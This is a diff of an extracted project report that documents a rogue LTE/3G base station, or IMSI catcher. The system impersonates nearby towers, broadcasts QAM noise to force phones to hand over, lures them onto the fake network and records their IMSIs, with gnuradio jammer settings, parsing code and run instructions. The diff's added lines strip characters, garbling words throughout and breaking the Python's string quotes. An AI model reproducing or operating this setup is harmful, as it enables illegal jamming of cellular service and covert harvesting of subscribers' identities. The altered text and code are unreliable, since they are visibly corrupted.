@@ -6,7 +6,7 @@ For: OPR Laboratories
 
 Directed To: Dr. Reza Sedaghat
 
-//
+//
 
 Contents
 
@@ -88,21 +88,21 @@ LTE fdd enb mme.cc . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
 
 0.1 Common Terminology
 
-• UE: User Equipment or Mobile Device
+ UE: User Equipment or Mobile Device
 
-• eNodeB: Base Station
+ eNodeB: Base Station
 
-• PDSCH: Physical Downlink Shared Channel
+ PDSCH: Physical Downlink Shared Channel
 
-• LTE: Long Term Evolution
+ LTE: Long Term Evolution
 
-• XG: The X Generation of Communication technology
+ XG: The X Generation of Communication technology
 
-• UMTS: Universal Mobile Telecommunications Service
+ UMTS: Universal Mobile Telecommunications Service
 
-• QAM: Quadrature Amplitude Modulation
+ QAM: Quadrature Amplitude Modulation
 
-• sudo: Super User Do
+ sudo: Super User Do
 
 2
 
@@ -110,11 +110,11 @@ LTE fdd enb mme.cc . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
 
 In order to become acquainted with this project, it is important to understand the basis of this
 
-project. By analyzing the problem deﬁned in [1], and following their solution, it is possible to exploit
+project. By analyzing the problem dened in [1], and following their solution, it is possible to exploit
 
 the handshaking protocol with LTE networks. Several known issues exist with LTE (outlined in
 
-[2], and [3]), which also revealed other possible exploits. This report does not contain speciﬁcs on
+[2], and [3]), which also revealed other possible exploits. This report does not contain specics on
 
 these methods, other than the implementation to demonstrate and use these exploits. It is up to
 
@@ -122,7 +122,7 @@ the user to investigate the integrity of the implementation from their interpret
 
 at hand.
 
-This project also targets 3G-UMTS networks, in which can be exploited without any modiﬁ-
+This project also targets 3G-UMTS networks, in which can be exploited without any modi-
 
 cation to the standard operation of the network. Hence, a standard implementation of a 3G system
 
@@ -130,29 +130,29 @@ is required at most for exploitation. Again, this can be seen in [3].
 
 This was project was designed to restrict mobile device usage within a restricted area, which
 
-requires no human intervention. Speciﬁcally, this project is to remotely “block” the perpetrators
+requires no human intervention. Specically, this project is to remotely block the perpetrators
 
 within an area in which mobile device usage is prohibited (i.e. Examination Room, Movie Theatre,
 
-etc.). Also, this project had to conﬁrm to the laws put in place to mitigate the eﬀects of cellular
+etc.). Also, this project had to conrm to the laws put in place to mitigate the eects of cellular
 
 jamming, etc. After reading up on [1],[2], and [3] we applied the noted elements to create this
 
 project. The project consists of the following:
 
-• LTE eNodeB spooﬁng 1 This “forces” a mobile device to be lured onto a rogue LTE network
+ LTE eNodeB spoong 1 This forces a mobile device to be lured onto a rogue LTE network
 
-(this is an attack on availability, no practical attacks exist on the integrity and conﬁdentiality
+(this is an attack on availability, no practical attacks exist on the integrity and condentiality
 
 of LTE)
 
-• 3G-UMTS nodeB spooﬁng 2 This “forces” a mobile device to be lured onto a rogue 3G network
+ 3G-UMTS nodeB spoong 2 This forces a mobile device to be lured onto a rogue 3G network
 
-(this is an attack on availability, no practical attacks exist on the integrity and conﬁdentiality
+(this is an attack on availability, no practical attacks exist on the integrity and condentiality
 
 of 3G)
 
-• Signal Noise Generator 3 This is an attack on the availability of any signal processing device
+ Signal Noise Generator 3 This is an attack on the availability of any signal processing device
 1This may fall outside the legal requirements, and may be an issue. Conduct any testing on minimal transmission
 
 power levels, and within a faraday cage.
@@ -165,13 +165,13 @@ power levels, and within a faraday cage.
 
 3
 
-within a speciﬁed frequency range.
+within a specied frequency range.
 
 These requirements were approved by OPR Labs.
 
 0.3 Installation
 
-The installation process of this project requires a UNIX operating system. Speciﬁcally, this project
+The installation process of this project requires a UNIX operating system. Specically, this project
 
 requires the use of a Ubuntu-distro. The operating system used for testing was Ubuntu 16.04.
 
@@ -199,7 +199,7 @@ any search engine, and generally the problem will be resolved. It was not possib
 
 the potential missing packages as this is maintained by Ubuntu. These packages can be
 
-varied day-to-day, so once this project is “stable”, try to avoid updating system packages (other
+varied day-to-day, so once this project is stable, try to avoid updating system packages (other
 
 than security packages at which could compromise the system). It is also possible the installing
 
@@ -215,21 +215,21 @@ source software required for implementation is much too outdated. Therefore, the
 
 Source packages were used to accomplish the task at hand:
 
-– openlte: Installation Priority: HIGH *Required for project operation
+ openlte: Installation Priority: HIGH *Required for project operation
 
-– openbts: Installation Priority: HIGH *Required for project operation
+ openbts: Installation Priority: HIGH *Required for project operation
 
-– gnuradio: Installation Priority: NORMAL *Required for project operation if openlte was not
+ gnuradio: Installation Priority: NORMAL *Required for project operation if openlte was not
 
 able to successfully install gnuradio.
 
-– srsLTE:
+ srsLTE:
 
 Installation Priority: NORMAL *Required for project operation, however it is not
 
 limiting.
 
-You will require the use of the terminal, and may ﬁnd yourself in need of training. Please become
+You will require the use of the terminal, and may nd yourself in need of training. Please become
 
 up-to-date with typical terminal commands.
 
@@ -237,9 +237,9 @@ up-to-date with typical terminal commands.
 
 Figure 2: Terminal Process
 
-To begin the installation process, it may be beneﬁcial to create a working directory for all
+To begin the installation process, it may be benecial to create a working directory for all
 
-project ﬁles. Hence, you can use the command:
+project les. Hence, you can use the command:
 
 $ mkdir yourDirName
 
@@ -253,14 +253,14 @@ pletely follow the steps outlined from this open-source project. Failure to do s
 
 non-compilation.
 
-• Description: This software provides a layer to layer implementation of an LTE network. It
+ Description: This software provides a layer to layer implementation of an LTE network. It
 
 holds all required resources for fundamental operations.
 
-• Compatible Hardware Devices: bladeRF, and USRP B210
+ Compatible Hardware Devices: bladeRF, and USRP B210
 
 0.3.3 openbts
-The installation method can be found at https : //umtrx.org/applications/openbts − umts/.
+The installation method can be found at https : //umtrx.org/applications/openbts  umts/.
 
 Completely follow the steps outlined from this open-source project. Failure to do so will result in
 
@@ -268,21 +268,21 @@ non-compilation.
 
 6
 
-• Description: This software provides a layer to layer implementation of a UMTS network. It
+ Description: This software provides a layer to layer implementation of a UMTS network. It
 
 holds all required resources for fundamental operations.
 
-• Compatible Hardware Devices: Only USRP N210
+ Compatible Hardware Devices: Only USRP N210
 
 0.3.4 gnuradio
 
 Only proceed with this installation process if openlte did not install gnuradio correctly. You can
 
-ﬁnd installation instructions here: https : //wiki.gnuradio.org/index.php/InstallingGR
+nd installation instructions here: https : //wiki.gnuradio.org/index.php/InstallingGR
 
-• Description: This software provides signal processing tools that can be physically realizable.
+ Description: This software provides signal processing tools that can be physically realizable.
 
-• Compatible Hardware Devices: bladeRF, USRP N210 and USRP B210
+ Compatible Hardware Devices: bladeRF, USRP N210 and USRP B210
 
 0.3.5 srsLTE
 
@@ -292,11 +292,11 @@ quired for the fundamental operation of this project, but is required to identif
 
 cellular towers in a local area, and extract information required for the operation of this.
 
-• Description: This software provides a layer to layer implementation of an LTE network. It
+ Description: This software provides a layer to layer implementation of an LTE network. It
 
 holds all required resources for fundamental operations.
 
-• Compatible Hardware Devices: bladeRF, and USRP B210
+ Compatible Hardware Devices: bladeRF, and USRP B210
 
 0.3.6 mysql
 
@@ -316,7 +316,7 @@ sudo apt install mysql-dev
 
 This project was implemented with a combination of programming languages and environments.
 
-However, Python v2.7 was used as a staple for the project. One beneﬁt of python is the number of
+However, Python v2.7 was used as a staple for the project. One benet of python is the number of
 
 maintained and included libraries which ease development needs. The Python environment even has
 
@@ -332,9 +332,9 @@ Please read up on documentation surrounding this tool.
 
 Due to the random nature of Open Source projects, dependencies on other Open Source projects,
 
-operating system packages and system tools, and various other requirements make aﬀect the opera-
+operating system packages and system tools, and various other requirements make aect the opera-
 
-tion of this project. There is absolutely no way to combat these eﬀects, as these packages/projects
+tion of this project. There is absolutely no way to combat these eects, as these packages/projects
 
 used in this project are out of our control.
 
@@ -348,17 +348,17 @@ packages.
 
 0.3.9 Overview
 
-After copying the implementation ﬁles into the working directory (all the ﬁles provided by OPR,
+After copying the implementation les into the working directory (all the les provided by OPR,
 
-which are all the python related scripts highlighted in blue) you must also copy the following ﬁles:
+which are all the python related scripts highlighted in blue) you must also copy the following les:
 
-• From srsLTE: cell search, pdsch ue, these ﬁles are highlighted in yellow
+ From srsLTE: cell search, pdsch ue, these les are highlighted in yellow
 
-• From openbts: comp128, comp128, sipauthserve, transceiver, and OpenBTS − UMTS, these
+ From openbts: comp128, comp128, sipauthserve, transceiver, and OpenBTS  UMTS, these
 
-ﬁles are highlighted in green
+les are highlighted in green
 
-The ﬁnal structure you should attain appears as the following directory tree:
+The nal structure you should attain appears as the following directory tree:
 yourProjectDir
 
 cell search.py
@@ -384,13 +384,13 @@ In this section, an exploration of the ideas of implementation are discussed and
 
 allows for complete transparency when utilizing this project. Every part of this project has an
 
-intended and useful purpose. There is also one modiﬁed ﬁle from an Open Source package.
+intended and useful purpose. There is also one modied le from an Open Source package.
 
 0.4.1
 
 LTE fdd enb mme.cc
 
-This particular ﬁle is included with the openlte software.
+This particular le is included with the openlte software.
 
 It contains the necessary logic and
 
@@ -408,11 +408,11 @@ the LTE network. That is, it is possible to force any UE into locking onto a mal
 
 In particular, upon reception of any request from the UE, the malicious eNodeB will send back an
 
-IMSI identity request. Upon reception of the UE’s identity, it is possible to accept them onto the
+IMSI identity request. Upon reception of the UEs identity, it is possible to accept them onto the
 
 network. However, no authentication can take place as it is unfeasible (cryptographically speaking)
 
-to guess the key (Please refer to the Milenage protocol deﬁned in the 3GPP standards).
+to guess the key (Please refer to the Milenage protocol dened in the 3GPP standards).
 
 Therefore, as long as the UE is actively searching for a new eNodeB to camp on, or the
 
@@ -420,7 +420,7 @@ connection between a previously connected eNodeB has very high SIR (Signal to In
 
 9
 
-then this particular exploit can take place. Hence, this modiﬁcations that have taken place are noted
+then this particular exploit can take place. Hence, this modications that have taken place are noted
 
 below:
 
@@ -483,7 +483,7 @@ break;
 
 ...
 
-These modiﬁcations allow for the request of UE identities, as well as luring and “hooking” of a UE
+These modications allow for the request of UE identities, as well as luring and hooking of a UE
 
 to camp to a malicious eNodeB. 4
 
@@ -491,7 +491,7 @@ to camp to a malicious eNodeB. 4
 
 cell search.py
 
-The ﬁle cell search.py, is required for the identiﬁcation of nearby cellular towers, or eNodeBs. In
+The le cell search.py, is required for the identication of nearby cellular towers, or eNodeBs. In
 
 order to complete the above luring/hooking, the malicious eNodeB should be an impersonation of a
 
@@ -501,47 +501,47 @@ order to complete the above luring/hooking, the malicious eNodeB should be an im
 
 legitimate eNodeB. Take the following example: Suppose there is an individual, namely, individual
 
-X. This particular individual is a police oﬃcer. Now suppose there exists another individual
+X. This particular individual is a police ocer. Now suppose there exists another individual
 
 who is able to completely impersonate X. This person can be referred to as Y . If Y completely
 
 impersonates X, how can one distinguish the two individuals? This example explains why eNodeB
 
-“sniﬃng” is a requirement.
+sning is a requirement.
 
 To accomplish this task of impersonation, the open source project srsLTE was used in accor-
 
-dance with a python script to extract nearby eNodeB conﬁgurations. Speciﬁcally, the srsLTE open
+dance with a python script to extract nearby eNodeB congurations. Specically, the srsLTE open
 
-source software package contains an executable ﬁle named pdsch ue. The term pdsch corresponds
+source software package contains an executable le named pdsch ue. The term pdsch corresponds
 
 to the physical downlink shared channel. This particular channel in the LTE network provides
 
-the UE with all required information for conﬁguration parameters, and authentication material.
+the UE with all required information for conguration parameters, and authentication material.
 
-Therefore, by utilizing this executable ﬁle and automating the use of this ﬁle with a python script,
+Therefore, by utilizing this executable le and automating the use of this le with a python script,
 
-it is possible to search through all applicable bands within a speciﬁed geographic area. However,
+it is possible to search through all applicable bands within a specied geographic area. However,
 
-this requires a predecessor executable ﬁle from the srsLT E package. This executable is named
+this requires a predecessor executable le from the srsLT E package. This executable is named
 
-cell search, and is able to identify active eNodeB’s within a geographic area.
+cell search, and is able to identify active eNodeBs within a geographic area.
 
-This executable ﬁle parses the active eNodeBs by band. By identifying the active eNodeBs,
+This executable le parses the active eNodeBs by band. By identifying the active eNodeBs,
 
-it possible to specify the frequency on which the pdsch exists, and collect the conﬁguration and
+it possible to specify the frequency on which the pdsch exists, and collect the conguration and
 
-identiﬁcation material. Although this ﬁle is a requirement of the project, other ﬁles which require
+identication material. Although this le is a requirement of the project, other les which require
 
-these conﬁguration parameters have been hardcoded only for prototyping purposes. Therefore
+these conguration parameters have been hardcoded only for prototyping purposes. Therefore
 
 you should note this application is not exactly streamlined, and needs further work. That is, the
 
-extraction of conﬁguration parameters is not automated, due to the complexity of the ASN1C
+extraction of conguration parameters is not automated, due to the complexity of the ASN1C
 
-encoding and decoding process. Several libraries have been identiﬁed which can complete the
+encoding and decoding process. Several libraries have been identied which can complete the
 
-process, yet have limited API’s or no documentation. Therefore, this should be investigated. In
+process, yet have limited APIs or no documentation. Therefore, this should be investigated. In
 
 the mean time, any hexadecimal string that is generated can be decoded through the use of this
 
@@ -549,9 +549,9 @@ web application:
 
 http://www.marben-products.com/asn.1/services/decoder-asn1-lte.html
 
-To use this website 5, and extract the relevant conﬁguration parameters, copy and paste the hex-
+To use this website 5, and extract the relevant conguration parameters, copy and paste the hex-
 
-adecimal output collected from pdsch ue, into the “Decode from Direct Input” box. Again it is
+adecimal output collected from pdsch ue, into the Decode from Direct Input box. Again it is
 
 5It may be wise to investigate how this particular website has implemented the ASN decoder
 
@@ -559,15 +559,15 @@ adecimal output collected from pdsch ue, into the “Decode from Direct Input”
 
 worth noting that this application is required only if moving to other geographic areas. This project
 
-has been conﬁgured to behave correctly within OPR-Labs, Toronto, Ontario.
+has been congured to behave correctly within OPR-Labs, Toronto, Ontario.
 
-This particular ﬁle has four methods to which are used:
+This particular le has four methods to which are used:
 
 1. parseASN1() *Requires ASN1 implementation
 
-2. update() Saves active eNodeBs to a ﬁle (.csv) for later access.
+2. update() Saves active eNodeBs to a le (.csv) for later access.
 
-3. getCellInfo() Captures the eNodeB conﬁguration data, to be parsed by parseASN1()
+3. getCellInfo() Captures the eNodeB conguration data, to be parsed by parseASN1()
 
 4. run() Initializes the program/script and executes the update() and getCellInfo() methods.
 
@@ -577,13 +577,13 @@ Note: Refer to appendix for full implementation.
 
 elevated user.py
 
-The ﬁle elevated user.py was created to establish permissions for users of this application. Since
+The le elevated user.py was created to establish permissions for users of this application. Since
 
-this project’s purpose is to limit access of mobile device within a speciﬁed area, there are cases in
+this projects purpose is to limit access of mobile device within a specied area, there are cases in
 
-which one or more users may have “administrator” privileges may be allowed to use their mobile
+which one or more users may have administrator privileges may be allowed to use their mobile
 
-device. This particular situation is possible since the ﬁle LTE fdd enb mme.cc can check against a
+device. This particular situation is possible since the le LTE fdd enb mme.cc can check against a
 
 list of authorized users before conducting the proposed attack. As noted within the description of
 
@@ -597,9 +597,9 @@ is a one to one match with the IMSIs, then the user will be sent a reject reques
 
 network (this project), and re-authenticate on a legitimate eNodeB.
 
-This ﬁle has been implemented only to store the IM SIs of users who are authorized to use
+This le has been implemented only to store the IM SIs of users who are authorized to use
 
-their cell phones. The ﬁle LTE fdd enb mme.cc has not yet been modiﬁed for checking incoming
+their cell phones. The le LTE fdd enb mme.cc has not yet been modied for checking incoming
 
 IMSIs against this particular list. This is required for future work. This was not an urgent matter,
 
@@ -621,27 +621,27 @@ As noted in the description of LTE fdd enb mme.cc, a UE will only search for sur
 
 if and only if:
 
-• The UE has just booted, and is searching for an eNodeB to connect on, or
+ The UE has just booted, and is searching for an eNodeB to connect on, or
 
-• The UE has poor SIR, and requires a handover.
+ The UE has poor SIR, and requires a handover.
 
-By introducing a speciﬁc amount of noise in the atmosphere, it is possible to approach the second
+By introducing a specic amount of noise in the atmosphere, it is possible to approach the second
 
-option to lure the UE to camp on a malicious eNodeB. Hence, this particular ﬁle provides only
+option to lure the UE to camp on a malicious eNodeB. Hence, this particular le provides only
 
-one method to do so. Speciﬁcally, this ﬁle generates a random bit stream and modulates these
+one method to do so. Specically, this le generates a random bit stream and modulates these
 
 sequences using QAM. This is important to note as LTE utilizes some variant of QAM (either 16,
 
 32 or 64 bit QAM). These signal processing techniques were completed with use of the gnuradio
 
-library, and the use of the bladeRF software deﬁned radio. Attached is the signal processing block
+library, and the use of the bladeRF software dened radio. Attached is the signal processing block
 
-structure implemented within this ﬁle :
+structure implemented within this le :
 
 Figure 3: QAM Block Structure
 
-However, due to physical limitations of software deﬁne radio, and associated hardware, it is
+However, due to physical limitations of software dene radio, and associated hardware, it is
 not possible to generate QAM modulated noise across all active bands of mobile servicing. Instead,
 
 13
@@ -702,26 +702,26 @@ global isRunning
 isRunning=False
 return isRunning
 
-if __name__ == ’__main__’:
+if __name__ == __main__:
 
 main()
 
-This particular implementation allows for complete utilization of the software deﬁned radio, and
+This particular implementation allows for complete utilization of the software dened radio, and
 allows this software system to target at least one band, and at most two bands at a time. By
-doing so, mobile devices are gradually ’lured’ onto the malicious base station conﬁgured through
+doing so, mobile devices are gradually lured onto the malicious base station congured through
 
 14
 
-It is worthwhile to mention that the software deﬁned implementation of
+It is worthwhile to mention that the software dened implementation of
 LTE fdd enb mme.cc.
-UMTS does not require any modiﬁcation to its structure to conduct this project. Therefore, this is
-no purpose to mention this technology. This particular ﬁle is executed by a thread, in conjunction
-with other threads of operation. Attached below is the signal processing block deﬁnitions.
+UMTS does not require any modication to its structure to conduct this project. Therefore, this is
+no purpose to mention this technology. This particular le is executed by a thread, in conjunction
+with other threads of operation. Attached below is the signal processing block denitions.
 
 ##################################################
 # Blocks
 ##################################################
-#self.osmosdr_sink_0 = osmosdr.sink( args="numchan=" + str(1) + " " + ’’ )
+#self.osmosdr_sink_0 = osmosdr.sink( args="numchan=" + str(1) + " " +  )
 self.osmosdr_sink_0 = osmosdr.sink( args="bladerf numchan=1" )
 #self.osmosdr_sink_0 = osmosdr.sink( args="uhd numchan=1" )
 self.osmosdr_sink_0.set_sample_rate(samp_rate)
@@ -730,7 +730,7 @@ self.osmosdr_sink_0.set_freq_corr(0, 0)
 self.osmosdr_sink_0.set_gain(100, 0)
 self.osmosdr_sink_0.set_if_gain(20, 0)
 self.osmosdr_sink_0.set_bb_gain(20, 0)
-self.osmosdr_sink_0.set_antenna(’’, 0)
+self.osmosdr_sink_0.set_antenna(, 0)
 self.osmosdr_sink_0.set_bandwidth(100e6, 0)
 
 self.digital_qam_mod_0 = digital.qam.qam_mod(
@@ -779,9 +779,9 @@ randint(0, 255, 1000)), True)
 
 interact.py
 
-This ﬁle is eﬀectively the core of the project. It maintains three threads,
+This le is eectively the core of the project. It maintains three threads,
 
-1. Thread 1 (blanket): This thread handles the QAM noise generation, by running the ﬁle
+1. Thread 1 (blanket): This thread handles the QAM noise generation, by running the le
 
 qam noise.py as its method. All output from this method is displayed to notify the user of
 
@@ -789,15 +789,15 @@ which band is being targeted for noise distribution
 
 2. Thread 2 (lte in): This thread launches a telnet session in which is required to communicate
 
-with the openlte software package. This thread in particular handles the dynamic conﬁgura-
+with the openlte software package. This thread in particular handles the dynamic congura-
 
-tions required by each new malicious eNodeB, speciﬁcally conﬁguring the MCC, MNC, cell id,
+tions required by each new malicious eNodeB, specically conguring the MCC, MNC, cell id,
 
 n id cell, dl earfcn, and more. These parameters mentioned here are from the 3GPP stan-
 
 dard, to which the reader of this report should familiarize themselves with this standard. This
 
-is also covered brieﬂy through the openlte website.
+is also covered briey through the openlte website.
 
 3. Thread 3 (lte out): This thread parses the output collected by the openlte software.
 
@@ -805,7 +805,7 @@ Its
 
 purpose is to identify the IMSIs of lured users and add it to the mysql database for later use.
 
-Attached below are the deﬁnitions of the three threads:
+Attached below are the denitions of the three threads:
 
 thread.start_new_thread(lte_in,())
 thread.start_new_thread(lte_out,())
@@ -817,17 +817,17 @@ pass
 
 It is now worth mentioning how this luring of UEs can only take place sequentially. Due to the
 
-limitations of software deﬁned radios and the associated hardware, it is not possible to setup
+limitations of software dened radios and the associated hardware, it is not possible to setup
 
-multiple eNodeBs with one software deﬁne radio. With the provided hardware, it will never be
+multiple eNodeBs with one software dene radio. With the provided hardware, it will never be
 
-possible to meet this desire. Therefore, each malicious eNodeB conﬁguration will only last a
+possible to meet this desire. Therefore, each malicious eNodeB conguration will only last a
 
 total of T seconds, the same amount of time in which the QAM noise generator switches bands.
 
 Upon timeout, of after t + T seconds, the malicious eNodeB becomes disabled, allowing for a new
 
-conﬁguration to be loaded onto the software deﬁned radio.
+conguration to be loaded onto the software dened radio.
 
 While the eNodeB is running, all output collected from openlte is parsed within thread 3,
 
@@ -850,31 +850,31 @@ if "IMSI=" in line:
 try:
 
 #Going to extract the IMSI using Regular Expression.
-line= re.search(’IMSI=(.*?) is’,line).group(1)
+line= re.search(IMSI=(.*?) is,line).group(1)
 
 0.4.6
 
 umts cover.py
 
-This ﬁle has a similar behaviour to interact.py, in which the openbts open source software
+This le has a similar behaviour to interact.py, in which the openbts open source software
 
-package can be dynamically set for each malicious nodeB conﬁguration. That is, while changing
+package can be dynamically set for each malicious nodeB conguration. That is, while changing
 
 the malicious eNodeB for the LTE network, the UMTS network should also follow suit, and change
 
-its respective conﬁguration to match the network to which it is impersonating. The only diﬀerence
+its respective conguration to match the network to which it is impersonating. The only dierence
 
 is that this particular script needs to execute out-of-sync (with respect to time) in order to execute
 
 properly. Due to an issue within the USRP/UHD library, programs that use these libraries do not
 
-distinguish which USRP to use at runtime. To operate this project, three software deﬁne radios
+distinguish which USRP to use at runtime. To operate this project, three software dene radios
 
 are used, two of which are USRPs. For the openlte, only the USRP B210 is compatible for LTE
 
 transmission. However, openbts has the capability to utilize both the USRP B210, and the USRP
 
-N210. This can cause either (1) a race condition, or (2) a conﬁguration mis-match where the
+N210. This can cause either (1) a race condition, or (2) a conguration mis-match where the
 
 openlte software associates with incompatible hardware. To temporarily alleviate this issue, the
 
@@ -882,11 +882,11 @@ timer for this script runs 30 seconds longer than the timer used for both the QA
 
 and the eNodeB script (interact.py.
 
-Note: this ﬁle could not be included with the intellis.py framework as it uses a subprocess
+Note: this le could not be included with the intellis.py framework as it uses a subprocess
 to complete the desired task, as does interact.py. However, running multiple subprocesses within
-one Python script causes one child process to not run. To combat this eﬀect, the operating system
+one Python script causes one child process to not run. To combat this eect, the operating system
 will execute this program independently in order to let the operating system handle the context
-switching, and to allow both child processes to run “concurrently”.
+switching, and to allow both child processes to run concurrently.
 
 ...
 def run():
@@ -912,13 +912,13 @@ okay=True
 
 ...
 
-It is also important to note that the openbts is ineﬃcient for dynamic changes. It requires that
+It is also important to note that the openbts is inecient for dynamic changes. It requires that
 
-all conﬁguration changes take place on a restart of the program/device. To automate this process,
+all conguration changes take place on a restart of the program/device. To automate this process,
 
-every malicious conﬁguration required with this program to start twice:
+every malicious conguration required with this program to start twice:
 
-1. Start-Up for conﬁguration load-in.
+1. Start-Up for conguration load-in.
 
 2. Kill Process.
 
@@ -930,7 +930,7 @@ every malicious conﬁguration required with this program to start twice:
 
 intellis.py
 
-intellis.py provides the CLI for the user to interact with this project. This CLI provides ﬁve
+intellis.py provides the CLI for the user to interact with this project. This CLI provides ve
 
 options to the user:
 
@@ -972,27 +972,27 @@ super user privileges, however its only purpose is to provides a central point o
 
 pects/components of the project. The most notable commands is run and settings, which either
 
-execute the ﬁles interact.py and cell search.py, respectively.
+execute the les interact.py and cell search.py, respectively.
 
 0.4.8 Notes
 
-As with any project, there are always modiﬁcations to be made, bugs to be ﬁxed, etc. The
+As with any project, there are always modications to be made, bugs to be xed, etc. The
 
-software issues faced in this project are large, from orientating diﬀerent programming languages,
+software issues faced in this project are large, from orientating dierent programming languages,
 
-to interfering with software deﬁne radios. Therefore, it may be wise to implement a version control
+to interfering with software dene radios. Therefore, it may be wise to implement a version control
 
 system to help limit the amount of change that can occur over a time period.
 
 It is also important to note that this project has been optimized for the geographic setting
 
-of OPR labs. That is, the related conﬁguration parameters have been hard-coded into several of
+of OPR labs. That is, the related conguration parameters have been hard-coded into several of
 
 the python scripts (i.e. interact.py, umts cover.py) purely for the sake of proof of concept. To
 
 create a feasible project, all processes included in this project need to be (1) streamlined, (2) have
 
-little to no code dependency to external projects (open source or not), and (3) be ﬂuid.
+little to no code dependency to external projects (open source or not), and (3) be uid.
 
 19
 
@@ -1012,7 +1012,7 @@ sudo apt-get install tmux
 
 0.5.2 Executing the Project
 
-Upon success. Navigate to the directory in which all the ∗.py ﬁles exist. You can use the terminal
+Upon success. Navigate to the directory in which all the .py les exist. You can use the terminal
 
 to accomplish this task:
 
@@ -1032,7 +1032,7 @@ Execute the following commands to complete this:
 
 $ tmux split-window
 
-At this instant, press Ctrl+b+(the up arrow key) to enter back into the ﬁrst multiplexed
+At this instant, press Ctrl+b+(the up arrow key) to enter back into the rst multiplexed
 
 window. Within the window enter:
 
@@ -1066,9 +1066,9 @@ employed. No other action is required for this process. However, this program pl
 
 on another programs operational standards. Due to an uncertain race condition, not all hardware
 
-can be conﬁgured at once. That is, the USRP B210 device (the software deﬁned radio used for
+can be congured at once. That is, the USRP B210 device (the software dened radio used for
 
-LTE transmissions) must be transmitting before the USRP N210 can be plugged in an conﬁgured.
+LTE transmissions) must be transmitting before the USRP N210 can be plugged in an congured.
 
 Hence, after a red LED is active on the USRP B210, proceed with the following:
 
@@ -1096,7 +1096,7 @@ operation of the project. These options could be omitted if need be.
 
 0.5.3 Known Issues
 
-Having three software deﬁned radios operating “at once” places extreme stress on the operating
+Having three software dened radios operating at once places extreme stress on the operating
 
 system, and the hardware of said system. The experience stress on the system sometimes cause
 
@@ -1112,17 +1112,17 @@ is due to a race condition within the USRP libraries installed with openlte, or 
 
 combat this issue, following the operating instructions exactly. It is also known that the openlte
 
-process will sometimes “die” unexpectedly. The cause is not known.
+process will sometimes die unexpectedly. The cause is not known.
 
 During operation of the umts cover.py script, there are two phases which take place. The
 
-program begins and conﬁgures the device. However, due to the nature of the openbts imple-
+program begins and congures the device. However, due to the nature of the openbts imple-
 
-mentation, the software deﬁned radio requires a restart/refresh. If the program is killed anytime
+mentation, the software dened radio requires a restart/refresh. If the program is killed anytime
 
-before this conﬁguration process is complete, the program will become invalid and a re-installation
+before this conguration process is complete, the program will become invalid and a re-installation
 
-of openbts is required. After this conﬁguration process has taken place, it is okay to end the
+of openbts is required. After this conguration process has taken place, it is okay to end the
 
 program.
 
@@ -1171,7 +1171,7 @@ information for rogueBS
 try:
 
 hexStrn=""
-hexStrn=re.search(r’\[(.*?)\]’,line).group(1)
+hexStrn=re.search(r\[(.*?)\],line).group(1)
 hexStrn=hexStrn.replace(" ","")
 print("Hex String for Decode: "+hexStrn)
 
@@ -1194,7 +1194,7 @@ earfcn=int(re.search("EARFCN=(.*)",str(params[1])).group(1))
 print(earfcn)
 phyid=int(re.search("PHYID=(.*)",str(params[2])).group(1))
 print(phyid)
-with open("lte_cell_defs_band"+str(b)+".csv",’a+’) as f:
+with open("lte_cell_defs_band"+str(b)+".csv",a+) as f:
 
 f.write("Freq(MHz),EARFCN,PhyID\n")
 f.write(str(freq)+","+str(earfcn)+","+str(phyid)+"\n")
@@ -1310,11 +1310,11 @@ while x < 101:
 
 time.sleep(0.02)
 y=str(x)
-sys.stdout.write(colored("\rSetting Up: ",’red’)+y+"%.")
+sys.stdout.write(colored("\rSetting Up: ",red)+y+"%.")
 sys.stdout.flush()
 x=x+1
 
-sys.stdout.write(colored("\r****----**** Ready ****----****",’green’))
+sys.stdout.write(colored("\r****----**** Ready ****----****",green))
 sys.stdout.flush()
 print("")
 
@@ -1339,31 +1339,31 @@ while complete == 0:
 ans=raw_input(">> ")
 if ans is "1":
 
-name=raw_input(colored("Name?: ",’red’))
+name=raw_input(colored("Name?: ",red))
 cur=db.cursor()
-cur.callproc(’sp_findUser’,(name,))
+cur.callproc(sp_findUser,(name,))
 result=cur.fetchall()
 cur.close()
-if ’DNE’ not in result[0][0]:
+if DNE not in result[0][0]:
 
-print(colored("Authentication Required by: "+name,’red’))
+print(colored("Authentication Required by: "+name,red))
 psswrd=getpass.getpass("Password: ")
 if pbkdf2_sha256.verify(psswrd, result[0][0]):
 
 cur=db.cursor()
-cur.callproc(’sp_loginSuper’,(name,result[0][0]))
+cur.callproc(sp_loginSuper,(name,result[0][0]))
 
 26
 
 result=cur.fetchall()
 cur.close()
-if ’Welcome’ in result[0][0]:
+if Welcome in result[0][0]:
 
 complete=1
-print(colored(’Welcome ’+name+".",’green’))
-return ’Super ’+name
+print(colored(Welcome +name+".",green))
+return Super +name
 
-print(colored(result[0][0],’red’))
+print(colored(result[0][0],red))
 
 else:
 
@@ -1373,42 +1373,42 @@ else:
 
 if ans is "2":
 
-print(colored("Wrong password.",’red’))
+print(colored("Wrong password.",red))
 
-print(colored("User does not exist.",’red’))
+print(colored("User does not exist.",red))
 
-name=raw_input(colored("Name?: ",’red’))
+name=raw_input(colored("Name?: ",red))
 cur=db.cursor()
-cur.callproc(’sp_findUser’,(name,))
+cur.callproc(sp_findUser,(name,))
 result=cur.fetchall()
 cur.close()
-if ’DNE’ not in result[0][0]:
+if DNE not in result[0][0]:
 
-print(colored("Authentication Required by: "+name,’red’))
+print(colored("Authentication Required by: "+name,red))
 psswrd=getpass.getpass("Password: ")
 if pbkdf2_sha256.verify(psswrd, result[0][0]):
 
 cur=db.cursor()
-cur.callproc(’sp_loginAdmin’,(name,result[0][0]))
+cur.callproc(sp_loginAdmin,(name,result[0][0]))
 result=cur.fetchall()
 cur.close()
-if ’Welcome’ in result[0][0]:
+if Welcome in result[0][0]:
 
 complete=1
-print(colored(’Welcome ’+name+".",’green’))
-return ’Admin ’+name
+print(colored(Welcome +name+".",green))
+return Admin +name
 
 else:
 
-print(colored(result[0][0],’red’))
+print(colored(result[0][0],red))
 
-print(colored("Wrong password.",’red’))
-
-else:
+print(colored("Wrong password.",red))
 
 else:
 
-print(colored("User does not exist.",’red’))
+else:
+
+print(colored("User does not exist.",red))
 
 else:
 
@@ -1417,46 +1417,46 @@ complete=0
 def startUp(db):
 
 cur=db.cursor()
-cur.callproc(’sp_checkSuper’,())
+cur.callproc(sp_checkSuper,())
 result=cur.fetchall()
-print(’Database says: ’+result[0][0])
+print(Database says: +result[0][0])
 cur.close()
-if ’First’ in result[0][0]:
+if First in result[0][0]:
 
